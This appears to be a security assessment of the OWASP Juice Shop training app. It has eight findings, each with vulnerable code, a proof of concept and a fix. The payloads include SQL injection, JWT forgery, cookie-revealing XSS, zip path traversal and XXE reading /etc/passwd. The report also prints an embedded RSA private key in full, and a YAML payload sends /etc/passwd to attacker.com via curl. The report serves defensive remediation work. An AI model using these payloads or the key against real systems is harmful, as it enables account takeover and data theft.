## SECVULN-001: SQL Injection in Authentication Allows Authentication Bypass

### Metadata
- **Severity**: P0 (Critical)
- **CWE**: CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- **CVSS 3.1**: 9.8 (Critical) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Component**: `routes/login.ts (line 36)`
- **Fix Priority**: Immediate

### Description
The login functionality in Juice Shop contains a critical SQL injection vulnerability where user input (email address) is directly concatenated into the SQL query without parameterization. This allows attackers to inject malicious SQL code that can bypass authentication, potentially accessing any user account including administrator accounts without knowing the password.

### Vulnerable Code
```typescript
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
```

### Attack Vector
User input from the login request (email parameter) is directly concatenated into SQL query without parameterization. An attacker can submit a specially crafted email value containing SQL injection syntax to manipulate the query logic and bypass authentication.

### Technical Impact
- **Confidentiality**: Complete authentication bypass and unauthorized access to any user account
- **Integrity**: Ability to impersonate users and perform unauthorized operations
- **Availability**: Potential to corrupt database through malicious SQL operations

### Proof of Concept
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "' OR 1=1--",
  "password": "anything"
}
```

### Remediation
Replace direct string concatenation with parameterized queries:

```typescript
// Replace:
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })

// With:
models.sequelize.query('SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL',
  {
    replacements: [req.body.email || '', security.hash(req.body.password || '')],
    model: UserModel,
    plain: true
  })
```

### Additional Controls
1. Implement consistent use of parameterized queries or ORM methods throughout the application
2. Add input validation for email format on the server side
3. Consider implementing API rate limiting to mitigate brute force attempts
4. Use a web application firewall with SQL injection detection capabilities

### References
1. [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
2. [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
3. [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
4. [Sequelize Documentation - Parameterized Queries](https://sequelize.org/master/manual/raw-queries.html)

   ## SECVULN-002: JWT Algorithm Confusion Attack Vulnerability

### Metadata
- **Severity**: P0 (Critical)
- **CWE**: CWE-347: Improper Verification of Cryptographic Signature
- **CVSS 3.1**: 9.1 (Critical) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Component**: `routes/verify.ts (lines 84-90)` and `lib/insecurity.ts (lines 54-58)`
- **Fix Priority**: Immediate

### Description
The JWT implementation in Juice Shop is vulnerable to algorithm confusion attacks. The application explicitly accepts tokens signed with the symmetric 'HS256' algorithm when it should only accept the asymmetric 'RS256' algorithm. This allows attackers to forge valid authentication tokens by signing them with the publicly accessible RSA public key as the symmetric secret, bypassing the authentication mechanism.

### Vulnerable Code
```typescript
// From lib/insecurity.ts (line 57)
export const verify = (token: string) => token ? (jws.verify as ((token: string, secret: string) => boolean))(token, publicKey) : false

// From routes/verify.ts (lines 84-90)
if (token) {
  const decoded = jwtLib.decode(token)
  jwt.verify(token, security.publicKey, (err: VerifyErrors | null, verified: JwtPayload) => {
    if (err === null) {
      challengeUtils.solveIf(challenge, () => { return hasAlgorithm(token, algorithm) && hasEmail(decoded, email) })
    }
  })
}
```

### Attack Vector
The application fails to validate the algorithm used for JWT signature verification. An attacker can obtain the public RSA key and use it as a symmetric secret to sign a forged JWT token with the HS256 algorithm, which will be accepted by the application's verification process.

### Technical Impact
- **Confidentiality**: Unauthorized access to protected resources and sensitive data
- **Integrity**: Impersonation of any user including administrators
- **Availability**: Complete bypass of authentication controls

### Proof of Concept
```javascript
// Using the public key from the application as the secret for HS256
const forgedToken = jwt.sign(
  {
    data: {
      id: 1,
      email: 'admin@juice-sh.op',
      role: 'admin'
    }
  },
  fs.readFileSync('encryptionkeys/jwt.pub', 'utf8'),
  { algorithm: 'HS256' }
);

// Then use in request
// Authorization: Bearer [forgedToken]
```

### Remediation
Explicitly restrict the allowed algorithms during JWT verification:

```typescript
// Replace in lib/insecurity.ts:
export const verify = (token: string) => token ? (jws.verify as ((token: string, secret: string) => boolean))(token, publicKey) : false

// With:
export const verify = (token: string) => {
  if (!token) return false;
  try {
    return jwt.verify(token, publicKey, {
      algorithms: ['RS256'] // Only allow RS256 algorithm
    });
  } catch (err) {
    return false;
  }
}

// And replace in routes/verify.ts (lines 115-116):
jwt.verify(token, security.publicKey, {
  algorithms: ['RS256'] // Only accept RS256 algorithm for normal operation
}, (err: VerifyErrors | null, verified: JwtPayload) => {
  if (err === null) {
    challengeUtils.solveIf(challenge, () => { return hasAlgorithm(token, algorithm) && hasEmail(decoded, email) })
  }
})
```

### Additional Controls
1. Explicitly specify and validate accepted algorithms during JWT verification
2. Implement proper key management for JWT signing keys
3. Use a dedicated JWT library with secure defaults
4. Consider adding token revocation capabilities

### References
1. [OWASP - JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
2. [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
3. [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
4. [JWT.io - JWT Debugging Tool](https://jwt.io)

   ## SECVULN-003: Cross-Site Scripting via Angular Sanitization Bypass

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-79: Improper Neutralization of Input During Web Page Generation
- **CVSS 3.1**: 8.2 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:L
- **Component**: `frontend/src/app/search-result/search-result.component.ts (line 160)`
- **Fix Priority**: High (Within 7 days)

### Description
The search functionality in Juice Shop contains a persistent Cross-Site Scripting vulnerability where the search query parameter is explicitly bypassing Angular's built-in HTML sanitization. The application uses the bypassSecurityTrustHtml() method which tells Angular to disable its automatic XSS protection. This allows attackers to inject malicious JavaScript that executes in victims' browsers when they view search results.

### Vulnerable Code
```typescript
// From search-result.component.ts (line 160)
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
```

### Attack Vector
An attacker can create a malicious URL with a search query parameter containing JavaScript code. When shared with or accessed by victims, the malicious code will execute in their browsers, potentially stealing cookies, session tokens, or performing actions on behalf of the victim.

### Technical Impact
- **Confidentiality**: Theft of session information and sensitive data visible in the browser
- **Integrity**: Ability to perform unauthorized actions on behalf of the victim
- **Availability**: Potential to disrupt the user experience through malicious scripts

### Proof of Concept
```
http://localhost:3000/#/search?q=<img src="x" onerror="alert(document.cookie)">
```

This simple proof of concept will display the user's cookies in an alert box when the search page loads. More sophisticated attacks could send this data to an attacker's server.

### Remediation
Remove the explicit sanitization bypass and use Angular's built-in protections:

```typescript
// Option 1: Use Angular's built-in sanitization
// Replace:
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)

// With:
this.searchValue = queryParam // Angular will automatically sanitize normal bindings

// Option 2: If HTML formatting is needed, properly sanitize first
import { sanitizeHtml } from '../../lib/sanitize-html';
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(sanitizeHtml(queryParam))
```

### Additional Controls
1. Never use bypassSecurityTrustHtml() without custom sanitization
2. Implement Content Security Policy (CSP) headers to prevent script execution
3. Add server-side validation and sanitization of query parameters
4. Consider using a web application firewall with XSS detection

### References
1. [OWASP - Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
2. [Angular Security - Sanitization](https://angular.io/guide/security#sanitization-and-security-contexts)
3. [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
4. [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

   ## SECVULN-004: Unrestricted File Upload Leading to Path Traversal

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- **CVSS 3.1**: 8.6 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L
- **Component**: `routes/fileUpload.ts (lines 39-47)`
- **Fix Priority**: High (Within 7 days)

### Description
The file upload functionality in Juice Shop contains a path traversal vulnerability that allows attackers to extract files from a ZIP archive to arbitrary locations on the server's filesystem. While the application attempts to validate file paths, it only checks if the absolute path includes the application path rather than verifying it's within the intended target directory, making the protection ineffective against path traversal attacks.

### Vulnerable Code
```typescript
const absolutePath = path.resolve('uploads/complaints/' + fileName)
if (absolutePath.includes(path.resolve('.'))) {
  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName).on('error', function (err) { next(err) }))
}
```

### Attack Vector
An attacker can upload a specially crafted ZIP file containing files with directory traversal sequences in their paths. When the server extracts these files, they can be written to arbitrary locations outside the intended directory, potentially overwriting critical system files.

### Technical Impact
- **Confidentiality**: Potential to access sensitive files on the server
- **Integrity**: Ability to overwrite application files or create malicious files
- **Availability**: Potential disruption of system operation through file corruption

### Proof of Concept
```bash
# Create a ZIP file containing a file with path traversal
echo "malicious content" > payload.txt
zip exploit.zip ../../etc/malicious-file.txt

# Upload the ZIP file to the application
curl -X POST -F "file=@exploit.zip" http://localhost:3000/file-upload
```

### Remediation
Implement proper path validation to ensure files can only be extracted to the intended directory:

```typescript
// Replace:
const absolutePath = path.resolve('uploads/complaints/' + fileName)
if (absolutePath.includes(path.resolve('.'))) {
  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName).on('error', function (err) { next(err) }))
}

// With:
const targetDir = path.resolve('uploads/complaints/');
const absolutePath = path.resolve(targetDir, fileName);

// Ensure the final path is within the target directory
if (absolutePath.startsWith(targetDir) && !path.basename(fileName).includes('..')) {
  const relativePath = path.relative(targetDir, absolutePath);
  // Additional check to prevent directory traversal
  if (!relativePath.includes('..') && !path.isAbsolute(relativePath)) {
    entry.pipe(fs.createWriteStream(absolutePath).on('error', function (err) { next(err) }))
  } else {
    entry.autodrain()
  }
} else {
  entry.autodrain()
}
```

### Additional Controls
1. Use a library designed for secure file extraction with built-in path traversal protections
2. Implement proper path canonicalization before validation
3. Consider a whitelist approach for acceptable file names
4. Run the application with minimal file system permissions

### References
1. [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
2. [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
3. [NodeJS Security Best Practices - File System](https://nodejs.org/en/docs/guides/security/)
4. [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

   ## SECVULN-005: XML External Entity (XXE) Injection in File Upload

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-611: Improper Restriction of XML External Entity Reference
- **CVSS 3.1**: 8.8 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Component**: `routes/fileUpload.ts (lines 75-106)`
- **Fix Priority**: High (Within 7 days)

### Description
The XML file upload functionality in Juice Shop is vulnerable to XML External Entity (XXE) injection attacks. The application processes XML files with the noent: true option enabled, which allows XML parsers to process external entity references. This can be exploited to read arbitrary files from the server's filesystem, perform server-side request forgery (SSRF), or cause denial of service attacks.

### Vulnerable Code
```typescript
const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })
```

### Attack Vector
An attacker can upload a crafted XML file containing external entity declarations that reference local files or external resources. When the XML parser processes these entities with the `noent: true` option, it will expand the entities and potentially expose sensitive information or make unwanted network requests.

### Technical Impact
- **Confidentiality**: Ability to read arbitrary files from the server's filesystem
- **Integrity**: Potential for server-side request forgery against internal systems
- **Availability**: Possibility of denial of service through resource exhaustion

### Proof of Concept
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<complaint>
  <text>&xxe;</text>
</complaint>
```

This XML file, when uploaded and processed by the vulnerable parser, would include the contents of the /etc/passwd file in the response.

### Remediation
Disable external entity processing in the XML parser:

```typescript
// Replace:
const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })

// With:
const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true })', sandbox, { timeout: 2000 })
```

### Additional Controls
1. Disable external entity processing in all XML parsers
2. Implement a whitelist of allowed XML operations
3. Consider using a security-focused XML parsing library
4. Validate and sanitize XML input before processing

### References
1. [OWASP - XML External Entity Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
2. [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
3. [OWASP - XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
4. [PortSwigger - XXE Attacks](https://portswigger.net/web-security/xxe)

   ## SECVULN-006: Open Redirect Vulnerability

### Metadata
- **Severity**: P2 (Medium)
- **CWE**: CWE-601: URL Redirection to Untrusted Site
- **CVSS 3.1**: 6.1 (Medium) - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- **Component**: `lib/insecurity.ts (lines 135-141)`
- **Fix Priority**: Medium (Within 14 days)

### Description
The redirect validation mechanism in Juice Shop contains an open redirect vulnerability. The application uses a weak validation method that only checks if the URL contains an allowed domain as a substring, rather than properly validating the hostname. This allows attackers to bypass the protection and redirect users to malicious websites by including an allowed domain somewhere in the URL.

### Vulnerable Code
```typescript
export const isRedirectAllowed = (url: string) => {
  let allowed = false
  for (const allowedUrl of redirectAllowlist) {
    allowed = allowed || url.includes(allowedUrl)
  }
  return allowed
}
```

### Attack Vector
An attacker can craft a malicious URL that includes an allowed domain as a substring (e.g., in a query parameter) but ultimately directs the user to a different, potentially malicious domain. When a victim clicks on a link using this redirect parameter, they will be redirected to the attacker's site.

### Technical Impact
- **Confidentiality**: User credentials could be compromised through phishing
- **Integrity**: Trust relationship between users and the application can be exploited
- **Availability**: No significant impact on availability

### Proof of Concept
```
http://localhost:3000/redirect?to=https://malicious-site.com?from=https://github.com/juice-shop/juice-shop
```

In this example, the URL contains the allowed domain (github.com/juice-shop/juice-shop) as a substring in a query parameter, but redirects to malicious-site.com.

### Remediation
Implement proper URL validation that checks the hostname rather than using a simple substring match:

```typescript
export const isRedirectAllowed = (url: string) => {
  try {
    const urlObj = new URL(url);
    for (const allowedUrl of redirectAllowlist) {
      const allowedUrlObj = new URL(allowedUrl);
      // Check if hostname matches or is a subdomain of allowed hostname
      if (urlObj.hostname === allowedUrlObj.hostname ||
          urlObj.hostname.endsWith('.' + allowedUrlObj.hostname)) {
        return true;
      }
    }
    return false;
  } catch (e) {
    return false; // Invalid URL
  }
}
```

### Additional Controls
1. Parse and validate URLs using proper URL parsing libraries
2. Use a whitelist approach for allowed domains
3. Consider including additional security checks like HTTPS enforcement
4. Implement relative redirects where possible to avoid external redirects

### References
1. [OWASP - Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
2. [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
3. [OWASP Top 10 - Unvalidated Redirects and Forwards](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)
4. [PortSwigger - Open Redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)

   ## SECVULN-007: Hardcoded JWT Private Key

### Metadata
- **Severity**: P0 (Critical)
- **CWE**: CWE-798: Use of Hard-coded Credentials
- **CVSS 3.1**: 9.1 (Critical) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **Component**: `lib/insecurity.ts (line 23)`
- **Fix Priority**: Immediate

### Description
The application contains a hardcoded RSA private key used for signing JWT tokens. This private key is embedded directly in the source code, making it accessible to anyone with access to the codebase. This compromises the entire authentication system as attackers can forge valid JWT tokens for any user, including administrators.

### Vulnerable Code
```typescript
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJX
lxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cI
xK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0
TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3
U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2e
nqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/Tsn
RWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00
Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----'
```

### Attack Vector
Anyone with access to the source code can extract the private key and use it to forge valid JWT tokens for any user identity, including administrators. This allows complete authentication bypass and privilege escalation within the application.

### Technical Impact
- **Confidentiality**: Ability to access sensitive data of any user by impersonating them
- **Integrity**: Complete compromise of the authentication system
- **Availability**: No direct impact on availability

### Proof of Concept
```javascript
// Using the private key extracted from the source code
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJX
lxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cI
xK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0
TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3
U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2e
nqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/Tsn
RWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00
Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----';

const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
  {
    data: {
      id: 1,
      email: 'admin@juice-sh.op',
      role: 'admin'
    }
  },
  privateKey,
  { algorithm: 'RS256', expiresIn: '1y' }
);

// Then use in request
// Authorization: Bearer [forgedToken]
```

### Remediation
Move the JWT private key to a secure configuration file outside of source control and load it at runtime:

```typescript
// Replace:
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJX
lxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cI
xK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0
TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3
U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2e
nqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/Tsn
RWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00
Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----'

// With:
import fs from 'fs';
let privateKey;
try {
  // Load from environment-specific secure location
  const keyPath = process.env.JWT_PRIVATE_KEY_PATH || 'config/keys/jwt.private.key';
  privateKey = fs.readFileSync(keyPath, 'utf8');
} catch (err) {
  console.error('Failed to load JWT private key:', err);
  process.exit(1); // Critical error - exit if key can't be loaded
}
```

### Additional Controls
1. Use a secrets management system for cryptographic keys
2. Never include private keys or credentials in source code
3. Use different keys for different environments
4. Implement key rotation procedures
5. Consider using a hardware security module (HSM) for key storage in production

### References
1. [OWASP - Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
2. [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
3. [NIST SP 800-57: Recommendation for Key Management](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)
4. [OWASP - Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html)

   ## SECVULN-008: Insecure Deserialization in YAML Processing

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-502: Deserialization of Untrusted Data
- **CVSS 3.1**: 8.8 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Component**: `routes/fileUpload.ts (lines 108-137)`
- **Fix Priority**: High (Within 7 days)

### Description
The application includes vulnerable YAML parsing code that can lead to remote code execution through insecure deserialization. The application uses the yaml.load() function without safe loading options to parse user-uploaded YAML files. This allows attackers to upload specially crafted YAML files containing serialized objects that, when deserialized, can execute arbitrary code on the server.

### Vulnerable Code
```typescript
const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })
```

### Attack Vector
An attacker can upload a YAML file containing specially crafted serialized objects with embedded code. When the application deserializes this content using the unsafe yaml.load() function, the embedded code can be executed in the server context, even with the VM sandbox.

### Technical Impact
- **Confidentiality**: Ability to read sensitive server data
- **Integrity**: Potential for executing arbitrary code on the server
- **Availability**: Ability to crash the application or consume resources

### Proof of Concept
```yaml
---
- !<tag:yaml.org,2002:js/function> |-
  function f() {
    require('child_process').exec('curl -X POST https://attacker.com/exfil --data "$(cat /etc/passwd)"');
    return true;
  }
# When deserialized, this may execute the function
constructor: !<tag:yaml.org,2002:js/function> |-
  function() {
    return f();
  }
```

### Remediation
Replace the unsafe yaml.load() function with the safe alternative yaml.safeLoad():

```typescript
// Replace:
const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })

// With:
// Use safeLoad instead of load to prevent deserialization attacks
const yamlString = vm.runInContext('JSON.stringify(yaml.safeLoad(data))', sandbox, { timeout: 2000 })
```

### Additional Controls
1. Always use safe deserialization methods for all formats (YAML, JSON, XML)
2. Implement content validation before deserialization
3. Run the application with minimal required permissions
4. Consider implementing a more restrictive sandbox for processing untrusted content
5. Validate the structure of deserialized data against a schema

### References
1. [OWASP - Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
2. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
3. [JS-YAML Documentation - Security](https://github.com/nodeca/js-yaml#safeload-string---options-)
4. [NodeJS Security Working Group - Deserialization](https://nodejs.org/en/docs/guides/security/)
   
